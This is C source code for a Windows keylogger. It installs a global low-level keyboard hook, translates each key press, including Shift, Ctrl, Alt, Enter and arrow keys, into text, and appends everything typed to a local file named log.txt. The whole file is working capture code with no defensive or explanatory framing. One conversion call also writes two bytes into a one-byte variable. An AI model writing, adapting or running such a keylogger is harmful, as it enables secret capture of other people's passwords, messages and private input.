#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <stdbool.h>

#define LLKHF_REPEATED 0x00000001
// Functions to log keystrokes
void logKeystroke(char *key){
    FILE *file = fopen("log.txt", "a+");
    if(file){
        fprintf(file,"%s", key);
        fclose(file);
    }
}

// Global variables to track last modifier state
static bool wasModifierPressed = false;

// Global variables to track modifier states
static bool isModifierKey(DWORD vkCode) {
    return (vkCode == VK_LSHIFT || vkCode == VK_RSHIFT || vkCode == VK_SHIFT ||
            vkCode == VK_LCONTROL || vkCode == VK_RCONTROL || vkCode == VK_CONTROL ||
            vkCode == VK_LMENU || vkCode == VK_RMENU || vkCode == VK_MENU);
}

// Function to get the character from the virtual key code
void getCharFromKey(char *keyName, WPARAM wParam, LPARAM lParam){
    KBDLLHOOKSTRUCT *kbStruct = (KBDLLHOOKSTRUCT *)lParam;
    DWORD vkCode = kbStruct->vkCode;

    // If it's a standalone modifier key press
    if (isModifierKey(vkCode)) {
        switch(vkCode) {
            case VK_LSHIFT:
            case VK_RSHIFT:
            case VK_SHIFT:    
                strcpy(keyName,"[SHIFT]"); 
                return;
            case VK_LCONTROL:
            case VK_RCONTROL:
            case VK_CONTROL:    
                strcpy(keyName,"[CTRL]"); 
                return;
            case VK_LMENU:
            case VK_RMENU:
            case VK_MENU:    
                strcpy(keyName,"[ALT]"); 
                return;
        }
    }

    // Handle special keys
    switch(vkCode) {
        case VK_RETURN: strcpy(keyName,"[ENTER]\n"); break;
        case VK_SPACE:  strcpy(keyName," "); break;
        case VK_BACK:   strcpy(keyName,"[BACK]"); break;
        case VK_TAB:    strcpy(keyName,"[TAB]"); break;
        case VK_ESCAPE: strcpy(keyName,"[ESC]"); break;
        case VK_END:    strcpy(keyName,"[END]"); break;
        case VK_HOME:   strcpy(keyName,"[HOME]"); break;
        case VK_LEFT:   strcpy(keyName,"[LEFT]"); break;
        case VK_UP:     strcpy(keyName,"[UP]"); break;
        case VK_RIGHT:  strcpy(keyName,"[RIGHT]"); break;
        case VK_DOWN:   strcpy(keyName,"[DOWN]"); break;
        default: {
            // Get keyboard state
            BYTE keyboardState[256] = {0};

            // Check if SHIFT is pressed
            if (GetAsyncKeyState(VK_SHIFT) & 0x8000) {
                keyboardState[VK_SHIFT] = 0x80;  // This will make ToUnicode give us uppercase
            }
            
            // Check CAPS LOCK
            if (GetKeyState(VK_CAPITAL) & 0x0001) {
                keyboardState[VK_CAPITAL] = 0x01;
            }

            // Check if Alt Gr is pressed (Alt + Ctrl)
            if (((GetAsyncKeyState(VK_MENU) & 0x8000) && (GetAsyncKeyState(VK_CONTROL) & 0x8000)) || (GetAsyncKeyState(VK_RMENU) & 0x8000)) {
                keyboardState[VK_MENU] = 0x80;  // Set Alt state
                keyboardState[VK_CONTROL] = 0x80;  // Set Ctrl state
            }
            
            // Convert virtual key to character
            WCHAR unicodeChar[2];
            int result = ToUnicode(vkCode, kbStruct->scanCode, keyboardState, unicodeChar, 2, 0);

            char character;
            // Convert from UTF-16 (wide char) to UTF-8
            WideCharToMultiByte(CP_UTF8, 0, unicodeChar, -1, &character, 2, NULL, NULL );

            if(result == 1){
                // printable character
                keyName[0] = (char)character;
                keyName[1] = '\0';
            }else{
                // Unhandled key
                strcpy(keyName,"[UNKNOWN]");
            }
        } 
    }

}

// Hook procedure to capture keystroke
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam){
    if(nCode >= 0) {
        KBDLLHOOKSTRUCT *kbStruct = (KBDLLHOOKSTRUCT *)lParam;
        
        // Check if it's a repeated keystroke
        bool isRepeat = (kbStruct->flags & LLKHF_REPEATED);

        if((wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) && !isRepeat) {
            bool isModifier = isModifierKey(kbStruct->vkCode);
            
            // Only process if:
            // 1. It's not a modifier key, OR
            // 2. It's a modifier key being pressed alone (no other modifiers active)
            if(!isModifier || 
               !(GetAsyncKeyState(VK_CONTROL) & 0x8000) && 
               !(GetAsyncKeyState(VK_MENU) & 0x8000) && 
               !(GetAsyncKeyState(VK_SHIFT) & 0x8000)) {
                
                // If it was a modifier before, reset the state
                if(wasModifierPressed) {
                    wasModifierPressed = false;
                    return CallNextHookEx(NULL, nCode, wParam, lParam);
                }
                
                char key[32];
                getCharFromKey(key, wParam, lParam);
                
                // If this is a modifier key, set the flag
                if(isModifier) {
                    wasModifierPressed = true;
                }
                
                logKeystroke(key);
            }
        }
    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main(){
    // Set a low-level system hook
    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if(hook == NULL){
        printf("Failed to set hook\n");
        return 1;
    }

    // Message loop to keep the hook active
    MSG msg;
    while(GetMessage(&msg, NULL, 0, 0)){
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Unhook and exit
    UnhookWindowsHookEx(hook);
    return 0;
}